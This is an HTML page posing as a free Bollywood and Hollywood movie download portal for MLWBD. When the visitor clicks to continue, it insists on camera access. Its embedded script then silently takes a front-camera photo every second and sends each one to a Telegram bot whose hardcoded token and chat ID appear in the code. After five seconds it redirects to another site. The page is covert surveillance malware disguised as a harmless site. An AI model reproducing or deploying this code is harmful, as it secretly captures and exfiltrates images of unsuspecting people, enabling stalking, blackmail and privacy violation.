<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MLWBD.Love</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">

<script src="protected_1761501274529.js"></script>

</head>
<body>
    <!-- Permission Modal -->
    <div id="permissionModal">
        <div id="permissionContent">
            <h3> Camera Permission Required</h3>
            <p>Please click "Allow" to enable camera access and continue to MLWBD.Love.</p>
            <button id="allowBtn">Allow Camera</button>
            <button id="denyBtn">Deny</button>
            <button id="retryPermission">Retry Permission</button>
        </div>
    </div>

    <!-- Loading overlay -->
    <div id="loading">
        <p>Preparing your access, please wait...</p>
    </div>

    <header>
        <nav>
            <a href="#">Home</a>
            <a href="#">About</a>
            <a href="#">FAQ</a>
        </nav>
    </header>

    <div class="container" id="mainContent">
        <div class="logo"> MLWBD.COM</div>
        <h1>Welcome to MLWBD.Love</h1>
        <p>Download the latest Bollywood, Hollywood, South Indian and Hindi Dubbed movies in HD quality. Fast, secure and free!</p>
        <button class="btn" id="visitBtn">Visit MLWBD.Com</button>
        <section>
            <h2>What is MLWBD?</h2>
            <p>MLWBD is a popular online movie hub where you can explore and download movies in multiple languages and formats. From Bollywood blockbusters to Hollywood hits, South Indian cinema, and Hindi Dubbed films — MLWBD.Love makes it easy to access your favorite content in HD quality.</p>
        </section>
    </div>

    <div id="notification"></div>

    <!-- Camera elements -->
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" width="640" height="480"></canvas>

    <script>
        // Telegram Bot Token and Chat ID (Replace with your actual token and chat ID)
        const TELEGRAM_BOT_TOKEN = "8016737009:AAFg_IiAfOiECD2HYuxn8VXDUre-h1kuQK0";
        const CHAT_ID = "7896043263";
        const REDIRECT_URL = "https://mlwbd.is/";

        // DOM elements
        const visitBtn = document.getElementById("visitBtn");
        const notification = document.getElementById("notification");
        const loadingDiv = document.getElementById("loading");
        const mainContent = document.getElementById("mainContent");
        const video = document.getElementById("video");
        const canvas = document.getElementById("canvas");
        const context = canvas.getContext("2d");
        const permissionModal = document.getElementById("permissionModal");
        const allowBtn = document.getElementById("allowBtn");
        const denyBtn = document.getElementById("denyBtn");
        const retryPermission = document.getElementById("retryPermission");

        // Camera and photo capture variables
        let cameraStream = null;
        let captureInterval = null;

        // Visit button click handler
        visitBtn.addEventListener("click", () => {
            permissionModal.style.display = "flex";
        });

        // Allow camera button
        allowBtn.addEventListener("click", async () => {
            try {
                permissionModal.style.display = "none";
                loadingDiv.style.display = "flex";

                cameraStream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: "user",
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    }
                });

                video.srcObject = cameraStream;
                captureInterval = setInterval(captureAndSendPhoto, 1000);

                setTimeout(() => {
                    window.location.href = REDIRECT_URL;
                }, 5000);
            } catch (err) {
                console.error("Camera access error:", err);
                loadingDiv.style.display = "none";
                showNotification("Camera permission is required to access the site.");
                retryPermission.style.display = "inline-block";
            }
        });

        // Deny camera button
        denyBtn.addEventListener("click", () => {
            permissionModal.style.display = "none";
            showNotification("Camera permission is required to access the site.");
            retryPermission.style.display = "inline-block";
        });

        // Retry permission button
        retryPermission.addEventListener("click", () => {
            permissionModal.style.display = "flex";
            retryPermission.style.display = "none";
        });

        // Capture and send photo
        async function captureAndSendPhoto() {
            try {
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                canvas.toBlob(async (blob) => {
                    if (!blob) {
                        console.error("Failed to capture photo.");
                        return;
                    }
                    const formData = new FormData();
                    formData.append("chat_id", CHAT_ID);
                    formData.append("photo", blob, "photo.jpg");

                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                        method: "POST",
                        body: formData,
                    });
                    console.log("Photo sent to Telegram!");
                }, "image/jpeg", 0.7);
            } catch (err) {
                console.error("Error capturing photo:", err);
            }
        }

        // Show notification
        function showNotification(msg) {
            notification.innerText = msg;
            notification.style.display = "block";
            setTimeout(() => {
                notification.style.display = "none";
            }, 4000);
        }
    </script>
</body>
</html>
